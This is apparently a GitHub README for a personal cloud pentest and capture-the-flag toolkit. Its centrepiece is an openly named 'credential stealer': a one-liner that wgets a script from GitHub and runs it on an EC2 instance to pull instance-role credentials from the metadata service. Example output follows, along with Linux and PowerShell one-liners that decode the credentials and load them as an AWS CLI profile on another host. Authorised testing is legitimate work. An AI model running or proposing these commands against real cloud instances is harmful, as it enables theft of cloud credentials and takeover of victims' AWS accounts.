# moratti-cloud-toolkit

This is a collection of scripts to help me on cloud CTFs and pentests. 


### EC2 IMDSv2 Credential Stealer one-liner

`wget https://raw.githubusercontent.com/lmoratti/moratti-cloud-toolkit/main/main.py && python main.py`

I designed this script to work with Amazon Linux 2 default python libraries. This means its unfortunately a Python2 script because by default Python3 does not have requests imported.

There is a corresponding blog post on my medium blog here if you're interested:
https://medium.com/@morattisec

Example output:
```
 ********************************************************************** 

Attempting to exfiltrate EC2 instance role credentials.
   Attempting to PUT request to metadata endpoint to obtain token for subsequent requests.
        [SUCCESS]
   Enumerating role name for the EC2 instance profile.
        [SUCCESS]
   Making final request for credentials
        [SUCCESS]

These credentials expire after 6 hours. You can copy and paste this blob into ~/.aws/credentials to quickly make a profile from your host machine.

[AdministratorEc2]
aws_access_key_id = ASIAfakekeyhere
aws_secret_access_key = examplesecretkey
aws_session_token = actual_value_here

**One-liners to use on a different host to add this key as an AWS CLI profile **

 LINUX ONE-LINER:

echo -e "BIGBLOBOFBASE64HERE" | base64 -d >> ~/.aws/credentials 

 POWERSHELL ONE-LINER:

$ENCODED = "BIGBLOBOFBASE64HERE";$DECODED=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ENCODED));Add-Content $env:USERPROFILE\.aws\credentials $DECODED;$ENCODED="";$DECODED="";

Run this AWS CLI command to see if your profile works and if the name of the credentials is accurate.
aws --profile AdministratorEc2 sts get-caller-identity
```